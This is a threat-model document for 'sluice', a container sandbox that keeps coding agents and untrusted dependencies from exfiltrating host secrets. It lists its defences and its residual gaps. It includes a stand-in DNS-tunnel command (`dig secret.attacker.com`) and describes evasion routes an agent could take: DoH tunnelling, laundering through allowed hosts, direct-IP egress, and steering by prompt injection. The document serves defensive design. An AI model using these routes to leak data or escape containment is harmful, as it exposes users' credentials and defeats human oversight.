# Threat model

What sluice defends against, what it deliberately does not, and where it's currently
weak. Read this before trusting it with anything that matters. For how the pieces work,
see the [README](README.md).

## What it's for (and not)

sluice is **anti-exfiltration + isolation-from-your-own-machine** for code you mostly
trust but can't fully vouch for - your coding agent, AI-generated code, a dependency
tree. It is **not** hostile-multi-tenant isolation: it does not safely run a stranger's
deliberately malicious code next to other tenants. That job needs hypervisor-grade
isolation; sluice uses a normal container (shared kernel) on purpose - `SLUICE_RUNTIME=kata`
is the opt-in own-kernel runtime.

## Assets being protected

- **Host credentials/secrets** the sluice can reach: env vars forwarded via `SLUICE_ENV`,
  token files mounted via `SLUICE_MOUNTS`, anything `SLUICE_PRELAUNCH` stages, and the
  project's own secrets (`.env`, keys in the working tree) - the in-repo ones can be
  shadowed with `SLUICE_MASK` (limits below).
- **The rest of your machine:** other directories, other projects, your home dir.
- **Your network position:** internal/LAN services the host could otherwise reach.

## Adversary & trust boundary

| | |
|---|---|
| **Trusted** | the host; you, the `sluice.config.sh` author; the image build (runs pre-firewall with free egress) |
| **Untrusted** | everything executing **inside the sluice at runtime** - dependencies, the agent, generated code, tool/file inputs |

Threats in scope: a poisoned dependency (npm/pip post-install script), a prompt-injected
file or tool result steering an agent, or simply buggy agent code - any of which tries to
**exfiltrate secrets, tamper outside the project, or pivot into your network**.

### Data flow across the boundary

```
  HOST (trusted)                           |  CONTAINER (untrusted at runtime)
  ---------------------------------------  |  ------------------------------------------
  sluice.config.sh + build setup           |  image: deps baked pre-firewall (free egress)
  SLUICE_ENV / _MOUNTS / _PRELAUNCH    --> |  forwarded creds + project dir (read-write mount)
  SLUICE_POLICY_URL (fetched on host)  --> |  squid allowlist
                                           |
                                           |  app / agent / deps  (uid 1000, no effective caps)
                                           |       |  all tcp 80/443 redirected to squid
                                           |       v
                                           |  squid: only uid with egress; allow by Host/SNI,
                                           |  splice (never decrypt); IPv6 off, direct-IP/DoH dropped
                                           |       |
                                           |       v
                                           |  allowed hosts only
  =========================================+==========================================
  Right of the bar is untrusted at runtime; it reaches the network only through squid.
```

## Assumptions

The guarantees below hold only while these do:
- The **host is trusted** and uncompromised; the container engine + kernel enforce the isolation
  sluice configures.
- You **author and review** `sluice.config.sh` and anything it points at (`SLUICE_PRELAUNCH`,
  `SLUICE_POLICY_URL`) - these run host-side, pre-firewall, and are fully trusted.
- The **allowlist stays tight**: no allowed host doubles as a writable exfil channel, and
  `SLUICE_ALLOW_IPS` stays minimal (items 2-3 below).
- For the default runtime, the **shared host kernel** has no unpatched escape; `SLUICE_RUNTIME=kata`
  removes that assumption for the kernel-escape vector.

## What it defends against (today)

- **Secret exfiltration to arbitrary endpoints** -> default-DROP egress, enforced by an
  in-sluice **hostname-filtering proxy** (squid): all HTTP/HTTPS is redirected through it and
  allowed by **Host / TLS-SNI** (spliced, never decrypted), so the decision is by *domain*
  and survives IP rotation. Only the base hosts + `SLUICE_ALLOW_DOMAINS` are reachable. The boot
  self-test fails closed if a denied host (probed with a reserved `.invalid` name that can never be
  allowlisted, so the check always runs) or a direct-IP connection is reachable, asserts the IPv4
  `OUTPUT` policy is actually `DROP`, and asserts IPv6 egress is closed (the v6 stack absent, or
  `disable_ipv6` set, or `ip6tables` `OUTPUT` `DROP`) - so a silently-failed default-DROP can't leave
  egress open while the box reports `ready`.
- **IP-literal / DNS / IPv6 bypasses** -> a direct-IP HTTPS connection has no SNI ->
  terminated (and ledgered: the receipt + `sluice egress` count denied raw-IP requests, so a probe
  is visible, not just dropped); an intercepted plaintext-HTTP request is allowed by `Host`, which squid verifies against
  the IP the client actually connected to (`host_verify_strict`), so a forged `Host: <allowlisted>` to
  an arbitrary IP is refused; IPv6 is disabled entirely (we proxy v4 only, so a dual-stack app can't
  slip out over v6). **DNS resolution is scoped to the egress allowlist**: dnsmasq forwards only allowlisted names,
  and the firewall lets only it (not app code) reach a resolver - so an agent can't tunnel exfil as
  DNS labels to an off-allowlist authoritative nameserver (`dig secret.attacker.com`): a non-allowlisted
  name is answered locally with a dead sink (`192.0.2.1`, never forwarded), so the query never reaches
  that nameserver - while the sink connection still hits squid (so the block is logged for `learn`).
  Rebinding answers into RFC1918 are dropped. Known **DoH/DoT resolver
  endpoints** (`core/doh-endpoints.txt`) are denied *even if allowlisted* - otherwise an agent could
  tunnel exfil as DNS-over-HTTPS to an allowed resolver and bypass the SNI filter. `SLUICE_ALLOW_DOH=1`
  re-allows a DoH resolver; `SLUICE_DNS_OPEN=1` restores forward-all resolution (both weaken this).
  DNS-label exfil to an *allowlisted* parent (whose queries *do* forward) isn't blocked by the sink;
  `SLUICE_DNS_AUDIT=1` **detects** it - logging queries and flagging a tunnel pattern (many unique labels
  under one parent) in the receipt. Detection, not prevention: it surfaces the pattern for review, it
  does not stop the queries.
- **Inbound exposure of published ports** -> `SLUICE_PORTS` publishes on host loopback only
  (`127.0.0.1`), so only host-local processes can reach the app - never the LAN; the in-box
  firewall opens a matching inbound ACCEPT for just those ports.
- **Reading/altering the rest of your machine** -> only the project dir (and its git
  common dir, for worktrees) is mounted. Nothing else is visible by default; `SLUICE_MOUNTS`,
  `SLUICE_STATE_DIRS`, and `SLUICE_OVERLAY_DIRS` add only what the config author lists. The git
  common-dir mount is taken only when the worktree linkage verifies back to *this* repo, so a box that
  rewrites its own (writable) `.git` to point elsewhere can't redirect the mount at an unrelated repo.
  The mount scope equals the project dir (the dir of the found `sluice.config.sh`), so sluice **refuses to
  run** when that dir is your `$HOME`, `/`, or an ancestor of `$HOME` - launched there the box would
  bind-mount your whole home tree and expose `~/.ssh` and credential stores. `SLUICE_ALLOW_HOME=1` overrides.
- **Reading in-repo secrets (opt-in mask)** -> the project dir is mounted read-write,
  *including* its own `.env`/key files - "can't read your secrets" historically meant files
  *outside* the repo. `SLUICE_MASK` closes the in-repo gap: matching files get an empty
  read-only bind, matching dirs an empty tmpfs, so the box cannot read them (the agent
  presets mask `.env*` by default; it also stays in force during `learn --audit`). Honest
  limits: patterns are expanded **when the container starts** - a secret written later in
  the run is NOT masked (and survives until the next launch); the masked path's *existence*
  (its name) is still visible; an unmatched path - a different name, or nested deeper
  than the pattern reaches - is not protected; and a secret already **committed to git** stays
  readable in-box via history (`git show`) - the mask only empties the working-tree copy, not
  `.git/objects`, so remove committed secrets from history rather than relying on the mask. A
  matched **symlink** masks its in-project target (a target outside the mount already dangles).
  `sluice doctor` warns when secret-looking files (`.env*`, `*.pem`, `*key*.json`, ...) are present
  in the mount and unmasked, and when a masked file is git-tracked.
- **Host privilege escalation** -> sessions run non-root (uid 1000) with **no effective
  capabilities**; no Docker socket, no Docker-in-Docker, no in-box `sudo`. The base image is built
  with **every setuid/setgid bit stripped** (the shadow package's `passwd`/`chsh`/... are de-setuid
  at build), so uid 1000 has no setuid-root primitive *even independent of* `no-new-privileges` -
  which is also set, blocking any setuid path to root as a second layer. The container
  drops ALL capabilities and adds back only what the root entrypoint needs at boot (chown the mount,
  drop squid to its uid, run the firewall, bind DNS, reload squid). So even a compromised in-box
  process has no route to the capabilities or to root. `--pids-limit` (`SLUICE_PIDS_LIMIT`) and optional `--memory` (`SLUICE_MEMORY`) keep a runaway
  agent or build from exhausting the host. An opt-in hardened seccomp profile
  (`SLUICE_SECCOMP=hardened`) additionally errors the in-container namespace-creation / tracing /
  keyctl / mount syscall class; its denylist is a strict **superset of the engine default**, so it
  also closes the non-cap-gated primitives the default blocks (`userfaultfd`, the `personality`
  ADDR_NO_RANDOMIZE self-ASLR-disable, `kcmp`). Off by default since blocking userns breaks
  browser-engine sandboxes - `SLUICE_SECCOMP=browser` keeps the hardening but re-allows the
  unshare/clone/mount calls a browser needs for its own userns sandbox, and `=audit` logs would-be
  blocks (`SCMP_ACT_LOG`) instead of enforcing. An opt-in
  `SLUICE_READONLY_ROOT=1` makes the rootfs immutable (tmpfs the ephemeral paths; `/etc/squid` +
  `/home/sluice` become writable anon volumes pre-populated from the image) so a process can't tamper
  with system files or leave persistence. (On SELinux-enforcing hosts the box runs
  `--security-opt label=disable` so it can read the project mount; that drops the SELinux layer, but
  the guarantees above are unaffected.)
- **Host code execution from scaffolding an untrusted repo** -> `sluice init` reads the repo's
  manifests (`Procfile`, `Makefile`/`justfile` targets, `package.json` scripts, ...) to propose a
  run command and writes them into `sluice.config.sh`, which the launcher then **sources on the host**
  (pre-container, before any sandbox exists). So every repo-derived value init emits is **shell-quoted**
  (single-quoted, embedded quotes escaped) - inside single quotes a backtick, `$(...)`, `$var`, or `"`
  is literal, so a hostile value (e.g. a `Procfile` web line carrying a backtick) is the literal string
  when sourced, never executed. Running `sluice init` in an untrusted checkout does not run that repo's
  code on your host. (You still author and review the config you ultimately run - the values init
  proposes are advisory.)
- **Supply-chain fetch vs. runtime** -> deps are pulled at build (pre-firewall); the
  *running* container is locked to the allowlist. `sluice lock` records what was pulled; `sluice lock
  --pin` + `SLUICE_PIN=1` goes further - a **verified** replay from the recorded base digest + exact
  versions, checked against `sluice.lock` and failing closed on drift (inventory-identical, not
  bit-for-bit; see [docs/supply-chain.md](docs/supply-chain.md)).
- **Tampered sandbox core** -> the generic core (proxy, firewall, entrypoint, non-root user)
  can be pulled as a **cosign-signed base image** from GHCR (opt-in via `SLUICE_BASE_IMAGE`);
  `sluice` verifies the keyless signature - and the SBOM attestation alongside it - before
  building on it (`SLUICE_REQUIRE_SIGNED=1` to enforce). The image carries no private key (the
  splice cert is generated per-container). Your own layer on top is covered by `sluice lock`:
  a committable package inventory with drift detection, plus an advisory host-side CVE scan -
  a clean scan means "no *known* CVE in the scanner's DB," not proof of safety. Full tour:
  [docs/supply-chain.md](docs/supply-chain.md).

## What it does NOT defend against (be explicit)

1. **Kernel escape / multi-tenant adversary.** The default box shares the host kernel. For the
   kernel-escape vector there is now an **opt-in** own-kernel runtime (`SLUICE_RUNTIME=kata`, Linux +
   containerd/nerdctl) that runs the box as a Kata micro-VM with the same firewall + non-root + mount
   guarantees. Hostile multi-tenant isolation remains a non-goal.
2. **Exfil through an *allowed* host.** The allowlist is **host-granular**. If you allow
   a shared host - `raw.githubusercontent.com`, a cloud storage endpoint, an LLM API -
   data can be laundered through it. Keep the list minimal; never allow a host an attacker can also
   write to. `sluice` flags such a host at session start (`SLUICE_LAUNDERING_OK=1` acknowledges and
   silences it, `SLUICE_STRICT_LAUNDERING=1` refuses to run). The flag matches the **leading-dot
   wildcard** form too - both a wildcard *under* a launderer (`.storage.googleapis.com`) and a **parent**
   wildcard that *covers* one (`.googleapis.com`, which `sluice learn` can write by collapsing a sibling
   like `play.googleapis.com`) - so a wildcard allowlist can't slip a known launderer past the gate or a
   `forbid-laundering` policy.
   Volume through an allowed host can now be **bounded**: preventively with `SLUICE_EGRESS_HARD_CAP_BYTES`
   (an in-box `xt_quota` DROP on all proxied egress, so bytes are stopped mid-flight, not just gated
   after) and detectively with `SLUICE_EGRESS_MAX_BYTES` (total) / `SLUICE_EGRESS_HOST_BUDGETS`
   (per-host). A cap does not *inspect* the laundered request - it caps how much can leave.
3. **Exfil through `SLUICE_ALLOW_IPS`.** Reviewed fixed IPs get *direct* egress (the escape hatch for
   non-HTTP services like a database) - bypassing the proxy, so unfiltered by hostname. Scope each
   entry to one port with `ip:port` (a bare ip/cidr opens *every* port); keep the list minimal and specific.
   It is **IPv4-only** and floored at **/8**: an IPv6 literal, a **hostname** (fixed IPs only - a host
   would resolve to the in-box DNS sink), any `0.0.0.0/N`, and a prefix shorter than
   `/8` (e.g. the two-CIDR `0.0.0.0/1 128.0.0.0/1` cover) are **refused** host-side, and the in-box
   firewall independently refuses the same so a bypassed launcher check can't open all direct egress.
   A managed policy can additionally `deny-ip` a CIDR (refusing any entry that **overlaps** it in either
   direction) and mandate this lane's volume budget with `max-allow-ips-bytes`.
   This lane is no longer invisible: each entry routes through an accountable `SLUICE-ALLOWIPS` iptables
   chain, so its per-entry byte counters appear in the egress receipt (`allow_ips[]`), and
   `SLUICE_ALLOW_IPS_MAX_BYTES` sets a preventive shared volume budget across all direct-IP egress
   (over it, the flows are severed). Drop accountability is recorded for **every** box, lane
   configured or not: the firewall-dropped total (`fw_dropped`) and the count of raw-IP requests the
   proxy denied (`denied_ip_requests`) always appear in the receipt + `sluice egress --json`, so a
   raw-IP probe surfaces instead of vanishing from the hostname ledger. Still unfiltered by
   hostname - metering and a byte cap are the bound, not content inspection.
4. **A squid vulnerability or a loose allowlist.** The egress policy rests on squid +
   the allowlist file. A squid CVE or an over-broad `SLUICE_ALLOW_DOMAINS` is the trust anchor
   to guard - including the `.domain` wildcards `sluice learn` can write (a leading-dot entry
   matches *every* subdomain, so it's offered, never forced; prefer exact hosts when you can).
   `learn` applies your picks live (an in-place squid reload, no rebuild), but only ever **adds**
   the hosts you chose - it never weakens the non-HTTP/IPv6/non-root/direct-IP guarantees, and it
   applies the **same DoH/DoT filter the boot path does**: a resolver pick is refused (not written,
   not live) unless `SLUICE_ALLOW_DOH=1`, so the live box never diverges from a rebuilt one. It also
   honors a managed policy `deny` on this live path and **fails closed** if `SLUICE_POLICY_URL` is
   unreachable (the apply aborts rather than proceed without the policy), matching the run-time gate. (squid
   runs as its own uid; only that uid is granted direct egress, so app code can't reach the network
   except through it.)
5. **Destruction within the project dir.** By default it's mounted read-write, so the sluice
   can corrupt/delete your working tree (git history on the host is your backstop). Opt into
   `SLUICE_WORKSPACE=overlay` to mount the repo **read-only** and have the box edit a throwaway
   copy instead: the agent can't touch your files, and you review (`sluice diff`) and explicitly
   write back (`sluice apply`) - or discard by just stopping the box. `apply` deletes host files the
   box deleted only against a boot-time snapshot of the original; if seeding the copy ever fails (a
   partial `cp`), that snapshot is **skipped** and `apply` deletes nothing, so an incomplete copy can
   never cost you an untouched host file.
6. **Whatever `SLUICE_PRELAUNCH` does.** It runs on the **host** and is fully trusted - a
   malicious config is out of scope (you author it).
7. **Host-side Claude/editor hooks, side channels, timing.** Not addressed.
8. **Persisted state on the host.** `SLUICE_STATE_DIRS` (the agent presets use it) bind-mounts
   the agent's home subdirs to `~/.local/state/sluice/<project>/` - outside the project tree and
   kept across runs. The sandboxed agent reads/writes it (its own config/sessions and any tokens
   it caches there); treat that dir as sensitive, host-side state. `SLUICE_OVERLAY_DIRS` volumes
   likewise persist across container recreation; `sluice rm`/`prune` removes them with the box.
9. **`learn --audit` opens egress on purpose.** The opt-in discovery pass runs your command once
   with egress open to **all** HTTP/HTTPS hosts (incl. direct-IP on 80/443), so trusted code could
   exfiltrate over any host during that one run. It is gated precisely for this: **credential-stripped**
   (no `SLUICE_ENV`/`SLUICE_PRELAUNCH`/state dirs), **ephemeral** (a throwaway container, torn down
   after), loudly warned + confirm-gated, and never the default. Non-HTTP ports and IPv6 stay
   default-DROP. Use it only on code you trust.
10. **`SLUICE_POLICY_URL` is host-trusted and additive.** It's fetched on the **host** (before the box
    locks down) and can only **add** allowlist hosts - it never weakens the non-HTTP/IPv6/non-root/
    direct-IP guarantees. But the hosts it adds carry the same **allowed-host laundering** risk as any
    allowlist entry (item 2), and a malicious policy URL could add an exfil host - so point it only at a
    URL you control, same trust class as `SLUICE_PRELAUNCH` (you author the config).

## Scoped TLS interception (opt-in, off by default)

By default sluice **splices** every allowed host: it reads the SNI and passes the TLS through without
decrypting, so it can't inspect payloads (the allowed-host laundering gap, item 2). `SLUICE_BUMP_DOMAINS`
opts a **named** host into decryption: the box mints a per-container CA, trusts it, and forges that host's
cert so squid sees the full request and can filter by URL (`SLUICE_BUMP_URLS` denies non-matching paths;
omit it to allow the host wholesale but log full URLs). Every host *not* listed still splices - "never
decrypts" stays the default. Weigh before listing a host: (1) a CA signing key now lives in that one
container (per-run, never in the published base image; blast radius is the box itself); (2) **cert-pinned**
hosts can't be bumped and will fail TLS, so list only hosts you control or that don't pin; (3) you are
decrypting your own traffic to that host - the box's logs/egress receipt gain full URLs, so treat them as
sensitive. It narrows laundering for the listed host (path-level filtering) but does not eliminate it:
data hidden in an *allowed* path is still opaque. On the bumped lane, `SLUICE_BUMP_METHODS` restricts the
host to an HTTP-method allowlist (deny uploads) and `SLUICE_BUMP_MAX_BODY` caps request-body bytes - but
`SLUICE_BUMP_MAX_BODY` is **per request**: an attacker can loop many small POSTs, so it bounds a single
payload, not cumulative exfil. Pair it with a byte budget (`SLUICE_EGRESS_HARD_CAP_BYTES` / `_MAX_BYTES`)
for a cumulative bound.

## Egress receipts: what they attest (and don't)

Every run ends with an **egress receipt** and appends one record to a host-side, append-only,
hash-chained log (`egress-log.jsonl` in the state dir; `sluice egress --export` ships it, `--verify`
checks the chain). Precisely what that buys:

- **Captured host-side from squid's log.** The launcher reads the proxy's access log as root over
  `exec`; the in-box workload (uid 1000) can write neither that log nor the host-side store, so it
  cannot forge or erase a reached/blocked entry. The attestation is bounded by squid-log integrity,
  not by the workload behaving. If the in-box read itself can't run (e.g. the workload exhausts the
  pids cgroup so `exec` can't fork), the receipt records an explicit `unavailable` and `sluice egress`
  exits non-zero (the `SLUICE_EGRESS_MAX_BYTES` gate fails closed) rather than reading as zero egress;
  `sluice ls --egress` likewise shows the count as unknown (`?` human, `null` JSON), never `0`.
- **Tamper-evident, not tamper-proof.** The `prev`/`self` hash chain makes any edit, reorder, or
  deletion of a *past* record detectable by `--verify`; it does not stop a host with write access from
  rebuilding the whole chain. For non-repudiation, `--export` records into a store the producer can't
  reach (your SIEM).
- **Records egress seen, not payload.** Spliced (never decrypted) traffic is counted by host + bytes;
  data laundered inside an allowed-host request is in the byte total but not inspected (laundering,
  below). Volumes render in GB/TB and a single reached host over `SLUICE_EGRESS_FLAG_BYTES` (default
  1 GiB) is flagged **high volume** in the receipt (`high_volume` in the JSON), so a bulk transfer
  doesn't blend into an allowlisted row - a visibility aid, not a bound (the opt-in byte caps bound it).

## Residual risk, one line

Egress is **hostname-filtered** (squid splice) with IPv6 off, direct-IP and forged-Host HTTP blocked,
and **DNS scoped to the allowlist**, so the IP-rotation / direct-IP / forged-Host / DoH / DNS-label / v6
gaps are closed. The remaining
sharp edge is **allowed-host laundering**: because we splice (never decrypt), data hidden in a request
to an *allowed* host isn't inspected. Keep `SLUICE_ALLOW_DOMAINS`/`SLUICE_ALLOW_IPS` minimal (the
latter port-scoped) and never allow a host an attacker can also write to - `sluice` flags such a host
at run, a per-run **egress receipt** (hosts reached + bytes, in the state dir) makes after-the-fact
audit possible, and `SLUICE_EGRESS_MAX_BYTES` (whole-box) plus `SLUICE_EGRESS_HOST_BUDGETS` (per-host)
can gate CI on volume. These volume gates are **detective** - they surface and fail CI after the fact;
they do not stop bytes leaving mid-flight. An org can enforce a
deny-capable [central policy](docs/policy.md) that a developer's local config cannot loosen; that
policy is tamper-resistant only via its root-owned deployment, not by sluice itself (signing: v2.1).

---

_Last reviewed 2026-06-11 against sluice 0.9.0 (released) + the post-release hardening on main: seccomp
(default-superset / browser / audit), the egress work (allowlist-scoped DNS, port-scoped + validated
`SLUICE_ALLOW_IPS`, laundering-host gate, durable egress receipt + `SLUICE_EGRESS_MAX_BYTES`), in-repo
secret masking (`SLUICE_MASK`), the DoH-filtered live `learn` reload, the stripped-setuid base, and the
boot self-test's default-DROP policy assertions. Hardened 2026-06-13 from an adversarial audit:
clean-PATH root execs (no uid-1000 PATH-shadow privesc), `host_verify_strict` (forged-Host HTTP),
validated worktree common-dir mount, case-insensitive + wildcard-coverage DoH filter, fail-closed egress
audit, sanitized `doctor` output, policy deny over a covering allow wildcard, and the IPv6-closed
disjunction; plus `learn` failing closed on an unreachable `SLUICE_POLICY_URL`, matching the run path.
Hardened 2026-06-15: `sluice init` shell-quotes every repo-derived value it writes (the generated,
host-sourced config no longer executes a hostile `Procfile`/manifest value at scaffold time).
Hardened post-1.0: preventive egress volume caps (`SLUICE_EGRESS_HARD_CAP_BYTES` + the direct-IP
`SLUICE_ALLOW_IPS_MAX_BYTES`, xt_quota, fail-closed if absent); the accountable `SLUICE-ALLOWIPS` chain +
`fw_dropped` visibility; bumped-lane upload controls (`SLUICE_BUMP_METHODS` / `SLUICE_BUMP_MAX_BODY`,
per-request); the opt-in DNS-tunnel audit (`SLUICE_DNS_AUDIT`); and verified pinned replay
(`sluice lock --pin` + `SLUICE_PIN=1`). Hardened 2026-07-20: the laundering gate now also flags a
**parent wildcard that covers a known launderer** (`.googleapis.com` -> storage.googleapis.com), closing
a path where a `sluice learn` sibling-collapse re-opened an exfil host past the gate / a forbid-laundering
policy. Revisit when the egress path, mount model, or runtime options change._
